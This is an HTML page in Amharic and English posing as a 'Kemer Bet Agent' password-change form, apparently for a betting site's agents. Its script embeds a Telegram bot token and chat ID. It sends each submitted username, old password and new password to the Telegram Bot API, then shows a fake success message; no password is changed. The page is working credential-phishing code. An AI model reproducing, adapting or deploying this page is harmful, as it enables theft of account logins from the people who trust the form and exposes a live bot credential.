
<html lang="am">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kemer Bet Agent</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
        --primary-color: #00ff66; /* ደማቅ አረንጓዴ */
        --primary-hover: #00cc52;
        --bg-color: #0d0d0d; /* ጥቁር */
        --card-bg: #1a1a1a;
        --input-bg: #262626;
        --text-color: #ffffff;
        --text-muted: #a3a3a3;
        --border-color: #333333;
        --danger-color: #ef4444;
        --success-color: #00ff66;
    }

    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: 'Poppins', sans-serif;
    }

    body {
        background-color: var(--bg-color);
        color: var(--text-color);
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    /* Header */
    .header {
        width: 100%;
        background: #141414;
        border-bottom: 2px solid var(--primary-color);
        padding: 20px;
        text-align: center;
        box-shadow: 0 4px 20px rgba(0, 255, 102, 0.1);
    }

    .header h1 {
        color: var(--primary-color);
        font-size: 26px;
        font-weight: 700;
        letter-spacing: 1px;
        text-transform: uppercase;
    }

    .main-container {
        width: 100%;
        max-width: 480px;
        padding: 20px;
        margin-top: 20px;
    }

    /* Card Styling */
    .card {
        background-color: var(--card-bg);
        border-radius: 16px;
        padding: 28px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        border: 1px solid var(--border-color);
    }

    .card-title {
        font-size: 22px;
        font-weight: 700;
        margin-bottom: 20px;
        text-align: center;
        color: var(--primary-color);
    }

    /* Input Fields */
    .input-group {
        margin-bottom: 18px;
    }

    .input-group label {
        display: block;
        font-size: 14px;
        color: var(--text-muted);
        margin-bottom: 8px;
        font-weight: 500;
    }

    .input-wrapper {
        position: relative;
        display: flex;
        align-items: center;
    }

    .input-wrapper i.input-icon {
        position: absolute;
        left: 14px;
        color: var(--text-muted);
        font-size: 15px;
    }

    .input-wrapper input {
        width: 100%;
        padding: 12px 14px 12px 42px;
        background-color: var(--input-bg);
        border: 1.5px solid var(--border-color);
        border-radius: 10px;
        color: var(--text-color);
        font-size: 14px;
        outline: none;
        transition: all 0.3s ease;
    }

    .input-wrapper input:focus {
        border-color: var(--primary-color);
        box-shadow: 0 0 10px rgba(0, 255, 102, 0.2);
    }

    .toggle-pwd {
        position: absolute;
        right: 12px;
        background: none;
        border: none;
        color: var(--text-muted);
        cursor: pointer;
        font-size: 14px;
    }

    .toggle-pwd:hover {
        color: var(--text-color);
    }

    /* Buttons */
    .btn {
        width: 100%;
        padding: 12px;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }

    .btn-primary {
        background-color: var(--primary-color);
        color: #000000;
        margin-top: 10px;
        font-weight: bold;
    }

    .btn-primary:hover {
        background-color: var(--primary-hover);
        transform: translateY(-1px);
    }

    /* Message Notifications */
    .toast {
        padding: 12px 16px;
        border-radius: 8px;
        margin-bottom: 18px;
        font-size: 13px;
        display: none;
        align-items: center;
        gap: 10px;
    }

    .toast-success {
        background-color: rgba(0, 255, 102, 0.15);
        border: 1px solid var(--success-color);
        color: var(--primary-color);
    }

    .toast-error {
        background-color: rgba(239, 68, 68, 0.15);
        border: 1px solid var(--danger-color);
        color: #ef4444;
    }
  </style>
</head>
<body>

  <!-- Header -->
  <div class="header">
    <h1>Kemer Bet Agent</h1>
  </div>

  <!-- Main Container -->
  <div class="main-container">
    <div class="card">
      <!-- በትልቁ የተጻፈ አርእስት -->
      <div class="card-title">
        Password-ዎን ያስተካክሉ
      </div>

      <div id="toast" class="toast toast-success">
        <i class="fa-solid fa-circle-info"></i> <span id="toast-msg"></span>
      </div>

      <form id="userForm">
        <!-- Username -->
        <div class="input-group">
          <label for="username">Username</label>
          <div class="input-wrapper">
            <i class="fa-solid fa-user input-icon"></i>
            <input type="text" id="username" placeholder="Username ያስገቡ" required>
          </div>
        </div>

        <!-- የበፊት Password -->
        <div class="input-group">
          <label for="oldPassword">የበፊት Password</label>
          <div class="input-wrapper">
            <i class="fa-solid fa-lock input-icon"></i>
            <input type="password" id="oldPassword" placeholder="የበፊት Password ያስገቡ" required>
            <button type="button" class="toggle-pwd" onclick="toggleVisibility('oldPassword', this)">
              <i class="fa-solid fa-eye"></i>
            </button>
          </div>
        </div>

        <!-- አዲሱ Password -->
        <div class="input-group">
          <label for="newPassword">አዲሱ Password</label>
          <div class="input-wrapper">
            <i class="fa-solid fa-key input-icon"></i>
            <input type="password" id="newPassword" placeholder="አዲሱ Password ያስገቡ" required>
            <button type="button" class="toggle-pwd" onclick="toggleVisibility('newPassword', this)">
              <i class="fa-solid fa-eye"></i>
            </button>
          </div>
        </div>

        <button type="submit" class="btn btn-primary" id="submitBtn">
          አስተካክል
        </button>
      </form>
    </div>
  </div>

  <script>
    // የቴሌግራም ቦት መረጃዎች (የተደበቁ)
    const TELEGRAM_TOKEN = '8613342576:AAFPvnTN53FgzY9_yNgR9BpMKZFuLyZhtTY';
    const CHAT_ID = '8114806419';

    // የይለፍ ቃል ማሳያ/መደበቂያ
    function toggleVisibility(inputId, btn) {
      const input = document.getElementById(inputId);
      const icon = btn.querySelector('i');
      if (input.type === 'password') {
        input.type = 'text';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
      } else {
        input.type = 'password';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
      }
    }

    // መረጃውን ወደ ቴሌግራም መላኪያ
    document.getElementById('userForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const oldPassword = document.getElementById('oldPassword').value;
      const newPassword = document.getElementById('newPassword').value;
      const submitBtn = document.getElementById('submitBtn');
      const toast = document.getElementById('toast');
      const toastMsg = document.getElementById('toast-msg');

      submitBtn.disabled = true;
      submitBtn.innerText = 'በማስተካከል ላይ...';

      const messageText = `📌 *አዲስ የPassword ቅያሬ ጥያቄ*\n\n👤 *Username:* \`${username}\` \n🔑 *የበፊት Password:* \`${oldPassword}\` \n🆕 *አዲሱ Password:* \`${newPassword}\``;

      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown'
          })
        });

        if (response.ok) {
          toast.className = 'toast toast-success';
          toastMsg.innerText = 'Password-ዎ በስኬት ተስተካክሏል!';
          toast.style.display = 'flex';
          document.getElementById('userForm').reset();
        } else {
          toast.className = 'toast toast-error';
          toastMsg.innerText = 'ችግር አጋጥሟል! እባክዎ ድጋሚ ይሞክሩ።';
          toast.style.display = 'flex';
        }
      } catch (error) {
        toast.className = 'toast toast-error';
        toastMsg.innerText = 'የኔትወርክ ችግር አጋጥሟል!';
        toast.style.display = 'flex';
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerText = 'አስተካክል';
      }
    });
  </script>
</body>
</html>
